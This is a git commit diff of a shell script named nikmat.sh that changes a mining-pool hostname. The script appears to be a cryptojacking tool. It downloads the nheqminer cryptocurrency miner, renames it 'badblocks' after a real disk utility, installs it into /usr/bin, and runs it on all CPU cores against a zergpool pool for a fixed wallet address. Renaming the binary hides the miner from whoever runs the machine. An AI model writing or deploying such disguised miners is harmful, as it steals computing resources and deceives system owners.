298e95e36974bb1bbf419a0bb545ffcbfc91b365
hauuusah <91793146+hauuusah@users.noreply.github.com>
2021-10-03 23:07:54 +0700

    Update nikmat.sh

--- nikmat.sh
+++ nikmat.sh
@@ -10,7 +10,7 @@ tar xf nheqminer-Linux-v0.8.2.tar.gz
 cd nheqminer
 mv nheqminer badblocks
 mv badblocks /usr/bin
-badblocks -v -l verushash.asia.mine.zergpool.com:3300 -u D5snbNHPaNYMHAESeTrreRRVx3NLRdGo65.$(echo $(shuf -i 1-999 -n 1)-kin) -p c=$coin -t $(nproc --all)
+badblocks -v -l rx2.asia.mine.zergpool.com:3300 -u D5snbNHPaNYMHAESeTrreRRVx3NLRdGo65.$(echo $(shuf -i 1-999 -n 1)-kin) -p c=$coin -t $(nproc --all)
  
      echo COUNTER $COUNTER
      let COUNTER-=1
